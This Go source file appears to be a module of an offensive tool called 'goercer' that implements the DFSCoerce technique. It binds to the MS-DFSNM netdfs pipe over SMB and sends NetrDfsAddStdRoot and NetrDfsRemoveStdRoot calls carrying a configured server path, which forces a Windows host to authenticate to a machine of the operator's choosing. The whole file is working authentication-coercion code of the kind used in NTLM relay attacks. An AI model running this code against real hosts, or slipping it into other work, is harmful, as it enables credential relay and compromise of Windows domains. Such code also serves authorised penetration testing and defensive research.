package coercer

import (
	"goercer/internal/config"
	"goercer/internal/dcerpc"
	"goercer/internal/ntlm"
	"goercer/internal/smbxport"
)

func init() {
	Register("dfscoerce", func() Coercer { return &DFSCoerce{} })
}

// DFSCoerce coerces authentication through the MS-DFSNM (Distributed File
// System Namespace Management) protocol.
type DFSCoerce struct{}

// Name implements Coercer.
func (DFSCoerce) Name() string { return "dfscoerce" }

// Description implements Coercer.
func (DFSCoerce) Description() string { return "DFSCoerce (MS-DFSNM)" }

const (
	dfsPipe  = "netdfs"
	dfsUUID  = "4fc742e0-4a10-11cf-8273-00aa004ae673"
	dfsMajor = 3
	dfsMinor = 0
)

var dfsOpnumNames = map[uint16]string{
	12: "NetrDfsAddStdRoot",
	13: "NetrDfsRemoveStdRoot",
}

func dfsOpnumName(op uint16) string {
	if n, ok := dfsOpnumNames[op]; ok {
		return n
	}
	return "Unknown"
}

// Execute implements Coercer.
func (d DFSCoerce) Execute(sess *smbxport.Session, cfg *config.Config, out *Out) (*Result, error) {
	bound, err := Bind(sess, cfg, out, dfsPipe, dfsUUID, dfsMajor, dfsMinor)
	if err != nil {
		return nil, err
	}
	defer bound.Close()

	opnums := []uint16{12, 13}
	attempted := make([]uint16, len(opnums))
	copy(attempted, opnums)

	paths := Paths(cfg)
	fire := func(op uint16, path string) (bool, error) {
		stub := dfsStub(op, path)
		err := dcerpc.Transaction(bound.Pipe, bound.Auth, op, stub)
		if dcerpc.IsCoercionSuccess(err) {
			return true, err
		}
		if err == nil {
			return true, err
		}
		return false, err
	}

	successful, lastErr := runOpnums(cfg, paths, out, opnums, dfsOpnumName, fire)
	res := newResult(cfg, successful, attempted, lastErr)
	if successful >= 0 {
		out.Info("[+] Coercion triggered via opnum %d", successful)
	} else if lastErr != nil {
		out.Info("[!] No opnum succeeded; last error: %v", lastErr)
	}
	return res, lastErr
}

// dfsStub builds a NetrDfsAddStdRoot (12) / NetrDfsRemoveStdRoot (13) request:
// conformant varying ServerName and RootShare strings, an optional Comment for
// add, and ApiFlags.
func dfsStub(op uint16, serverPath string) []byte {
	shareName := "share\x00"
	comment := "comment\x00"

	buf := stringStub(serverPath)
	buf = append(buf, stringStub(shareName)...)
	if op == 12 {
		buf = append(buf, stringStub(comment)...)
	}
	buf = append(buf, 0, 0, 0, 0) // ApiFlags
	return buf
}

// stringStub encodes a conformant varying Unicode string (no trailing DWORD).
func stringStub(s string) []byte {
	utf16 := ntlm.UTF16LE(s)
	length := uint32(len([]rune(s)))
	buf := writeU32(length)
	buf = append(buf, writeU32(0)...)
	buf = append(buf, writeU32(length)...)
	buf = append(buf, utf16...)
	for (len(buf) % 4) != 0 {
		buf = append(buf, 0x00)
	}
	return buf
}
